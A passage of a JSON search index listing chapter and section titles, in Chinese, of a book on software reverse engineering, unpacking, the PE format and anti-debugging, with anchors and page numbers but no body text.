            "location": "/reversing/encrypt&decrypt/目录/#633-dsa-179", 
            "text": "", 
            "title": "6.3.3  DSA数字签名算法 179"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#634-elliptic-curve-cryptography-180", 
            "text": "", 
            "title": "6.3.4  椭圆曲线密码编码学（Elliptic Curve Cryptography） 180"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#64-186", 
            "text": "", 
            "title": "6.4  其他算法 186"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#641-crc32-186", 
            "text": "", 
            "title": "6.4.1  CRC32算法 186"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#642-base64-187", 
            "text": "", 
            "title": "6.4.2  Base64编码 187"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#65-188", 
            "text": "", 
            "title": "6.5  常见的加密库接口及其识别 188"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#651-miracl-189", 
            "text": "", 
            "title": "6.5.1  Miracl大数运算库 189"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#652-fgint-190", 
            "text": "", 
            "title": "6.5.2  FGInt 190"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#653-191", 
            "text": "", 
            "title": "6.5.3  其他加密算法库介绍 191"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#_5", 
            "text": "", 
            "title": "第四篇  语言和平台篇"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#7-delphi-194", 
            "text": "", 
            "title": "第7章  Delphi程序 194"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#71-dede-194", 
            "text": "", 
            "title": "7.1  DeDe反编译器 194"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#72-197", 
            "text": "", 
            "title": "7.2  按钮事件代码 197"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#73-197", 
            "text": "", 
            "title": "7.3  模块初始化与结束化 197"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#8-visual-basic-200", 
            "text": "", 
            "title": "第8章  Visual Basic程序 200"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#81-200", 
            "text": "", 
            "title": "8.1  基础知识 200"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#811-200", 
            "text": "", 
            "title": "8.1.1  字符编码方式 200"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#812-200", 
            "text": "", 
            "title": "8.1.2  编译模式 200"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#82-native-201", 
            "text": "", 
            "title": "8.2  自然编译（Native） 201"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#821-vb-201", 
            "text": "", 
            "title": "8.2.1  相关VB函数 201"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#822-vb-201", 
            "text": "", 
            "title": "8.2.2  VB程序比较方式 201"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#83-206", 
            "text": "", 
            "title": "8.3  伪编译 206"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#831-206", 
            "text": "", 
            "title": "8.3.1  虚拟机与伪代码 206"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#832-vb-p-code-208", 
            "text": "", 
            "title": "8.3.2  动态分析VB P-code程序 208"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#833-211", 
            "text": "", 
            "title": "8.3.3  伪代码的综合分析 211"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#834-vb-p-code-213", 
            "text": "", 
            "title": "8.3.4  VB P-code攻击实战 213"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#9-net-218", 
            "text": "", 
            "title": "第9章  .NET平台加解密 218"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#91-net-218", 
            "text": "", 
            "title": "9.1  .Net概述 218"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#911-net-218", 
            "text": "", 
            "title": "9.1.1  什么是.Net 218"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#912-218", 
            "text": "", 
            "title": "9.1.2  几个基本概念 218"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#913-net-219", 
            "text": "", 
            "title": "9.1.3  第一个.Net程序 219"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#92-msil-220", 
            "text": "", 
            "title": "9.2  MSIL与元数据 220"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#921-pe-220", 
            "text": "", 
            "title": "9.2.1  PE结构的扩展 220"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#922-netmsil-226", 
            "text": "", 
            "title": "9.2.2  .Net下的汇编MSIL 226"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#923-msil-228", 
            "text": "", 
            "title": "9.2.3  MSIL与元数据的结合 228"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#93-230", 
            "text": "", 
            "title": "9.3  代码分析技术 230"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#931-230", 
            "text": "", 
            "title": "9.3.1  静态分析 230"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#932-232", 
            "text": "", 
            "title": "9.3.2  动态调试 232"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#933-234", 
            "text": "", 
            "title": "9.3.3  代码修改 234"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#94-235", 
            "text": "", 
            "title": "9.4  代码保护技术及其逆向 235"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#941-235", 
            "text": "", 
            "title": "9.4.1  强名称 235"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#942-238", 
            "text": "", 
            "title": "9.4.2  名称混淆 238"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#943-241", 
            "text": "", 
            "title": "9.4.3  流程混淆 241"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#944-243", 
            "text": "", 
            "title": "9.4.4  压缩 243"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#945-247", 
            "text": "", 
            "title": "9.4.5  加密 247"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#946-253", 
            "text": "", 
            "title": "9.4.6  其他保护手段 253"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#95-net-254", 
            "text": "", 
            "title": "9.5  深入.Net 254"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#951-codedom-254", 
            "text": "", 
            "title": "9.5.1  反射与CodeDOM 254"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#952-unmaganed-api-256", 
            "text": "", 
            "title": "9.5.2  Unmaganed API 256"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#953-rotormononet-258", 
            "text": "", 
            "title": "9.5.3  Rotor、MONO与.Net内核 258"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#_6", 
            "text": "", 
            "title": "第五篇  系统篇"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#10-pe-262", 
            "text": "", 
            "title": "第10章  PE文件格式 262"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#101-pe-263", 
            "text": "", 
            "title": "10.1  PE的基本概念 263"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1011-264", 
            "text": "", 
            "title": "10.1.1  基地址 264"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1012-264", 
            "text": "", 
            "title": "10.1.2  相对虚拟地址 264"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1013-265", 
            "text": "", 
            "title": "10.1.3  文件偏移地址 265"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#102-ms-dos-265", 
            "text": "", 
            "title": "10.2  MS-DOS头部 265"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#103-pe-266", 
            "text": "", 
            "title": "10.3  PE文件头 266"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1031-signature-266", 
            "text": "", 
            "title": "10.3.1  Signature字段 266"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1032-image_file_header-267", 
            "text": "", 
            "title": "10.3.2  IMAGE_FILE_HEADER结构 267"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1033-image_optional_header-268", 
            "text": "", 
            "title": "10.3.3  IMAGE_OPTIONAL_HEADER结构 268"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#104-272", 
            "text": "", 
            "title": "10.4  区块 272"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1041-272", 
            "text": "", 
            "title": "10.4.1  区块表 272"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1042-274", 
            "text": "", 
            "title": "10.4.2  各种区块的描述 274"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1043-276", 
            "text": "", 
            "title": "10.4.3  区块的对齐值 276"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1044-276", 
            "text": "", 
            "title": "10.4.4  文件偏移与虚拟地址转换 276"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#105-278", 
            "text": "", 
            "title": "10.5  输入表 278"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1051-278", 
            "text": "", 
            "title": "10.5.1  输入函数的调用 278"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1052-279", 
            "text": "", 
            "title": "10.5.2  输入表结构 279"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1053-iat-281", 
            "text": "", 
            "title": "10.5.3  输入地址表（IAT） 281"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1054-281", 
            "text": "", 
            "title": "10.5.4  输入表实例分析 281"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#106-285", 
            "text": "", 
            "title": "10.6  绑定输入 285"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#107-286", 
            "text": "", 
            "title": "10.7  输出表 286"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1071-287", 
            "text": "", 
            "title": "10.7.1  输出表结构 287"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1072-288", 
            "text": "", 
            "title": "10.7.2  输出表结构实例分析 288"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#108-289", 
            "text": "", 
            "title": "10.8  基址重定位 289"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1081-289", 
            "text": "", 
            "title": "10.8.1  基址重定位概念 289"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1082-290", 
            "text": "", 
            "title": "10.8.2  基址重定位结构定义 290"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1083-291", 
            "text": "", 
            "title": "10.8.3  基址重定位结构实例分析 291"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#109-292", 
            "text": "", 
            "title": "10.9  资源 292"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1091-292", 
            "text": "", 
            "title": "10.9.1  资源结构 292"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1092-295", 
            "text": "", 
            "title": "10.9.2  资源结构实例分析 295"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1093-297", 
            "text": "", 
            "title": "10.9.3  资源编辑工具 297"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1010-tls-297", 
            "text": "", 
            "title": "10.10  TLS初始化 297"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1011-297", 
            "text": "", 
            "title": "10.11  调试目录 297"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1012-298", 
            "text": "", 
            "title": "10.12  延迟装入数据 298"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1013-299", 
            "text": "", 
            "title": "10.13  程序异常数据 299"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1014-net-299", 
            "text": "", 
            "title": "10.14  .Net头部 299"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1015-pe-300", 
            "text": "", 
            "title": "10.15  编写PE分析工具 300"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#10151-300", 
            "text": "", 
            "title": "10.15.1  文件格式检查 300"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#10152-fileheaderoptionalheader-300", 
            "text": "", 
            "title": "10.15.2  FileHeader和OptionalHeader内容的读取 300"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#10153-302", 
            "text": "", 
            "title": "10.15.3  得到数据目录表信息 302"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#10154-302", 
            "text": "", 
            "title": "10.15.4  得到区块表信息 302"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#10155-303", 
            "text": "", 
            "title": "10.15.5  得到输出表信息 303"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#10156-304", 
            "text": "", 
            "title": "10.15.6  得到输入表信息 304"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#11-306", 
            "text": "", 
            "title": "第11章  结构化异常处理 306"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#111-306", 
            "text": "", 
            "title": "11.1  基本概念 306"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1111-306", 
            "text": "", 
            "title": "11.1.1  异常列表 306"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1112-307", 
            "text": "", 
            "title": "11.1.2  异常处理的基本过程 307"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1113-seh-308", 
            "text": "", 
            "title": "11.1.3  SEH的分类 308"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#112-seh-308", 
            "text": "", 
            "title": "11.2  SEH相关数据结构 308"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1121-teb-308", 
            "text": "", 
            "title": "11.2.1  TEB结构 308"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1122-exception_registration-311", 
            "text": "", 
            "title": "11.2.2  EXCEPTION_REGISTRATION结构 311"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1123-exception_pointersexception-record", 
            "text": "", 
            "title": "11.2.3  EXCEPTION_POINTERS、EXCEPTION RECORD、"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1123-context-313", 
            "text": "", 
            "title": "11.2.3  CONTEXT 313"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#113-312", 
            "text": "", 
            "title": "11.3  异常处理回调函数 312"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#_7", 
            "text": "", 
            "title": "第六篇  脱壳篇"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#12-316", 
            "text": "", 
            "title": "第12章  专用加密软件 316"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#121-316", 
            "text": "", 
            "title": "12.1  认识壳 316"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1211-316", 
            "text": "", 
            "title": "12.1.1  壳的概念 316"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1212-317", 
            "text": "", 
            "title": "12.1.2  压缩引擎 317"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#122-317", 
            "text": "", 
            "title": "12.2  压缩壳 317"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1221-upx-318", 
            "text": "", 
            "title": "12.2.1  UPX 318"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1222-aspack-318", 
            "text": "", 
            "title": "12.2.2  ASPack 318"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#123-318", 
            "text": "", 
            "title": "12.3  加密壳 318"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1231-asprotect-318", 
            "text": "", 
            "title": "12.3.1  ASProtect 318"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1232-armadillo-319", 
            "text": "", 
            "title": "12.3.2  Armadillo 319"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1233-execryptor-320", 
            "text": "", 
            "title": "12.3.3  EXECryptor 320"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1234-themida-320", 
            "text": "", 
            "title": "12.3.4  Themida 320"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#124-321", 
            "text": "", 
            "title": "12.4  虚拟机保护软件 321"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1241-321", 
            "text": "", 
            "title": "12.4.1  虚拟机介绍 321"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1242-vmprotect-321", 
            "text": "", 
            "title": "12.4.2  VMProtect简介 321"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#13-324", 
            "text": "", 
            "title": "第13章  脱壳技术 324"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#131-324", 
            "text": "", 
            "title": "13.1  基础知识 324"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1311-324", 
            "text": "", 
            "title": "13.1.1  壳的加载过程 324"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1312-326", 
            "text": "", 
            "title": "13.1.2  脱壳机 326"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1313-326", 
            "text": "", 
            "title": "13.1.3  手动脱壳 326"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#132-oep-326", 
            "text": "", 
            "title": "13.2  寻找OEP 326"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1321-oep-326", 
            "text": "", 
            "title": "13.2.1  根据跨段指令寻找OEP 326"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1322-oep-330", 
            "text": "", 
            "title": "13.2.2  用内存访问断点找OEP 330"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1323-oep-331", 
            "text": "", 
            "title": "13.2.3  根据堆栈平衡原理找OEP 331"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1324-oep-332", 
            "text": "", 
            "title": "13.2.4  根据编译语言特点找OEP 332"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#133-332", 
            "text": "", 
            "title": "13.3  抓取内存映像 332"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1331-dump-332", 
            "text": "", 
            "title": "13.3.1  Dump原理 332"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1332-dumpanti-dump-334", 
            "text": "", 
            "title": "13.3.2  反Dump技术（Anti-Dump） 334"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#134-336", 
            "text": "", 
            "title": "13.4  重建输入表 336"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1341-336", 
            "text": "", 
            "title": "13.4.1  输入表重建的原理 336"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1342-iat-337", 
            "text": "", 
            "title": "13.4.2  确定IAT的地址和大小 337"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1343-iat-338", 
            "text": "", 
            "title": "13.4.3  根据IAT重建输入表 338"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1344-importrec-340", 
            "text": "", 
            "title": "13.4.4  ImportREC重建输入表 340"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1345-344", 
            "text": "", 
            "title": "13.4.5  输入表加密概括 344"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#135-dll-345", 
            "text": "", 
            "title": "13.5  DLL文件脱壳 345"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1351-oep-345", 
            "text": "", 
            "title": "13.5.1  寻找OEP 345"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1352-dump-347", 
            "text": "", 
            "title": "13.5.2  Dump映像文件 347"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1353-dll-348", 
            "text": "", 
            "title": "13.5.3  重建DLL的输入表 348"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1354-349", 
            "text": "", 
            "title": "13.5.4  构造重定位表 349"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#136-351", 
            "text": "", 
            "title": "13.6  附加数据 351"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#137-pe-353", 
            "text": "", 
            "title": "13.7  PE文件的优化 353"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#138-356", 
            "text": "", 
            "title": "13.8  压缩壳 356"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1381-upx-3565", 
            "text": "", 
            "title": "13.8.1  UPX外壳 3565"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1382-aspack-359", 
            "text": "", 
            "title": "13.8.2  ASPack外壳 359"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#139-363", 
            "text": "", 
            "title": "13.9  加密壳 363"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1391-asprotect-363", 
            "text": "", 
            "title": "13.9.1  ASProtect 363"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1392-themidiasdk-367", 
            "text": "", 
            "title": "13.9.2  Themidia的SDK分析 367"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1310-372", 
            "text": "", 
            "title": "13.10  静态脱壳 372"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#13101-loader-372", 
            "text": "", 
            "title": "13.10.1  外壳Loader的分析 372"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#13102-377", 
            "text": "", 
            "title": "13.10.2  编写静态脱壳器 377"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#_8", 
            "text": "", 
            "title": "第七篇  保护篇"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#14-380", 
            "text": "", 
            "title": "第14章  软件保护技术 380"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#141-380", 
            "text": "", 
            "title": "14.1  防范算法求逆 380"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1411-380", 
            "text": "", 
            "title": "14.1.1  基本概念 380"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1412-381", 
            "text": "", 
            "title": "14.1.2  堡垒战术 381"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1413-382", 
            "text": "", 
            "title": "14.1.3  游击战术 382"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#142-383", 
            "text": "", 
            "title": "14.2  抵御静态分析 383"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1421-383", 
            "text": "", 
            "title": "14.2.1  花指令 383"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1422-smc-385", 
            "text": "", 
            "title": "14.2.2  SMC技术实现 385"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1423-390", 
            "text": "", 
            "title": "14.2.3  信息隐藏 390"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1424-391", 
            "text": "", 
            "title": "14.2.4  简单的多态变形技术 391"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#143-392", 
            "text": "", 
            "title": "14.3  文件完整性检验 392"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1431-392", 
            "text": "", 
            "title": "14.3.1  磁盘文件校验实现 392"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1432-checksum-393", 
            "text": "", 
            "title": "14.3.2  校验和（Checksum） 393"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1433-393", 
            "text": "", 
            "title": "14.3.3  内存映像校验 393"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#144-395", 
            "text": "", 
            "title": "14.4  代码与数据结合技术 395"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1441-396", 
            "text": "", 
            "title": "14.4.1  准备工作 396"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1442-397", 
            "text": "", 
            "title": "14.4.2  加密算法选用 397"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1443-397", 
            "text": "", 
            "title": "14.4.3  手动加密代码 397"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1444-text-399", 
            "text": "", 
            "title": "14.4.4  使.text区块可写 399"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#145-399", 
            "text": "", 
            "title": "14.5  软件保护的若干忠告 399"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#15-401", 
            "text": "", 
            "title": "第15章  反跟踪技术 401"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#151-beingdebugged-401", 
            "text": "", 
            "title": "15.1  由BeingDebugged引发的蝴蝶效应 401"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1511-beingdebugged-401", 
            "text": "", 
            "title": "15.1.1  BeingDebugged 401"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1512-ntglobalflag-405", 
            "text": "", 
            "title": "15.1.2  NtGlobalFlag 405"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1513-heap-magic-407", 
            "text": "", 
            "title": "15.1.3  Heap Magic 407"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1514-beingdebugged-412", 
            "text": "", 
            "title": "15.1.4  从源头消灭BeingDebugged 412"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#152-native-413", 
            "text": "", 
            "title": "15.2  回归Native：用户态的梦魇 413"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1521-checkremotedebuggerpresent-413", 
            "text": "", 
            "title": "15.2.1  CheckRemoteDebuggerPresent 413"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1522-processdebugport-414", 
            "text": "", 
            "title": "15.2.2  ProcessDebugPort 414"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1523-threadhidefromdebugger-416", 
            "text": "", 
            "title": "15.2.3  ThreadHideFromDebugger 416"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1524-debug-object-419", 
            "text": "", 
            "title": "15.2.4  Debug Object 419"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1525-systemkerneldebuggerinformation-423", 
            "text": "", 
            "title": "15.2.5  SystemKernelDebuggerInformation 423"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1526-native-api-425", 
            "text": "", 
            "title": "15.2.6  Native API 425"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1527-hookantihook-430", 
            "text": "", 
            "title": "15.2.7  Hook和AntiHook 430"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#153-433", 
            "text": "", 
            "title": "15.3  真正的奥秘：小技巧一览 433"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1531-softice-433", 
            "text": "", 
            "title": "15.3.1  SoftICE检测方法 433"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1532-ollydbg-435", 
            "text": "", 
            "title": "15.3.2  OllyDbg检测方法 435"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1533-437", 
            "text": "", 
            "title": "15.3.3  调试器漏洞 437"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1534-438", 
            "text": "", 
            "title": "15.3.4  防止调试器附加 438"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1535-440", 
            "text": "", 
            "title": "15.3.5  父进程检测 440"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1536-440", 
            "text": "", 
            "title": "15.3.6  时间差 440"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1537-trap-flag-441", 
            "text": "", 
            "title": "15.3.7  通过Trap Flag检测 441"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1538-441", 
            "text": "", 
            "title": "15.3.8  双进程保护 441"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#16-442", 
            "text": "", 
            "title": "第16章  外壳编写基础 442"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#161-442", 
            "text": "", 
            "title": "16.1  外壳的结构 442"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#162-443", 
            "text": "", 
            "title": "16.2  加壳主程序 443"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1621-pe-443", 
            "text": "", 
            "title": "16.2.1  判断文件是否为PE格式 443"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1622-443", 
            "text": "", 
            "title": "16.2.2  文件基本数据读入 443"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1623-445", 
            "text": "", 
            "title": "16.2.3  附加数据读取 445"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1624-445", 
            "text": "", 
            "title": "16.2.4  输入表处理 445"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1625-448", 
            "text": "", 
            "title": "16.2.5  重定位表处理 448"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1626-450", 
            "text": "", 
            "title": "16.2.6  文件的压缩 450"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1627-453", 
            "text": "", 
            "title": "16.2.7  资源数据处理 453"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1628-457", 
            "text": "", 
            "title": "16.2.8  区块的融合 457"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#163-457", 
            "text": "", 
            "title": "16.3  外壳部分编写 457"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1631-458", 
            "text": "", 
